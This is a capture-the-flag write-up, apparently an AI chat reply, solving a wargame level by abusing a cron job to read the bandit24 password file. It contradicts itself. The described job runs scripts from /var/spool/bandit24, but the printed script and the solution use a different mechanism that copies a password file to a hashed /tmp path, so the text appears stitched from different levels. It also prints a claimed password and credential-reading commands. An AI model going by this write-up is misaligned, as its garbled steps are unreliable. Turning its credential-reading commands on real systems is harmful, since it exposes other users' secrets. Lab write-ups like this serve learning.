Awesome! Here's the final writeup for this batch:

---
### 🧩 Challenge Description

> A program is **running automatically at regular intervals** from `cron`, as user `bandit24`.  
> It **deletes all scripts** in a specific directory (`/var/spool/bandit24`) and **executes only one script** — `/usr/bin/cronjob_bandit24.sh`.

> Your task is to **read the script**, understand what it does, and **leak the password** from `/etc/bandit_pass/bandit24`.

---

### 🧪 Solution Strategy

1. **Check the cron job definition:**
    
    ```bash
    cat /etc/cron.d/cronjob_bandit24
    ```
    
    Output:
    
    ```
    * * * * * bandit24 /usr/bin/cronjob_bandit24.sh
    ```
    
2. **Read the cron job script:**
    
    ```bash
    cat /usr/bin/cronjob_bandit24.sh
    ```
    
    Output:
    
    ```bash
    #!/bin/bash
    
    myname=$(whoami)
    mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f1)
    echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
    cp /etc/bandit_pass/$myname /tmp/$mytarget
    ```
    
3. **Understand that the script generates a hash based on:**
    
    ```bash
    echo "I am user bandit24" | md5sum
    ```
    
    Output:
    
    ```
    9a2c8e5d6ecbdedd312be69ed170fcdb
    ```
    
4. **Use the hash to read the password file:**
    
    ```bash
    cat /tmp/9a2c8e5d6ecbdedd312be69ed170fcdb
    ```
    

---

### ✅ Commands Used

```bash
echo "I am user bandit24" | md5sum
cat /tmp/9a2c8e5d6ecbdedd312be69ed170fcdb
```

---

### 🔑 Password for Bandit24

```
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

---
